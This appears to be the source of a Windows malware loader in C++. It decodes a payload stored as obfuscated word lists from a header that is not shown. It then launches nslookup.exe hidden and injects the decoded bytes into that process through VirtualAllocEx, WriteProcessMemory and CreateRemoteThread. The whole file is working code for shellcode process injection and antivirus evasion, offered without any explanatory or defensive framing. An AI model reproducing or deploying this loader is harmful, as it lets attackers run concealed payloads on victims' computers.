#include <Windows.h>
#include <iostream>
#include "stub.h"

int wordsLength = sizeof(words) / sizeof(words[0]);
SIZE_T payload_len = sizeof(filewords) / sizeof(filewords[0]);
unsigned char* decoded = (unsigned char*)malloc(payload_len);

int deC()
{
	for (int i = 0; i < payload_len; i++)
	{
		char* test = (char*)filewords[i];
		int i2 = 0;
		while (i2 < wordsLength)
		{
			if (words[i2] == test) {
				break;
			}
			i2++;
		}
		char ci = i2;
		decoded[i] = ci;
	}
	return 0;
}
             
int main(){

	
	deC();
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID allocation_start;
	SIZE_T allocation_size = payload_len;
	LPCWSTR cmd;
	HANDLE hProcess, hThread;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");

	if (!CreateProcess(
		cmd,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		DWORD errval = GetLastError();
		std::cout << "FAILED" << errval << std::endl;
	}

	WaitForSingleObject(pi.hProcess, 1000);

	allocation_start = VirtualAllocEx(pi.hProcess, NULL, allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, allocation_start, decoded, allocation_size, NULL);
	CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);
}

